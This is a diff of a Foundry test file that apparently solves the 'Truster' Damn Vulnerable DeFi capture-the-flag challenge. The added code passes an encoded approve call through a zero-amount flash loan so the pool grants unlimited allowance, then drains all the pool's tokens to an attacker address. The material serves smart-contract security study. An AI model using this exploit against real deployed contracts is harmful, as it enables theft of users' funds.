@@ -37,10 +37,20 @@ contract Truster is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testTrusterExploit() public {
         /**
          * EXPLOIT START *
          */
+
+        bytes memory attackpayload = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
+        // Take a loan of 0 to make the contract call approve
+        trusterLenderPool.flashLoan(0, address(this), address(dvt), attackpayload);
+
+        uint bal = dvt.balanceOf(address(trusterLenderPool));
+        console.log("bal of lending pool",bal);
+
+        // Steal all tokens from pool
+        dvt.transferFrom(address(trusterLenderPool),address(attacker),bal);
 
         /**
          * EXPLOIT END *
@@ -55,3 +65,4 @@ contract Truster is Test {
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
     }
 }
+
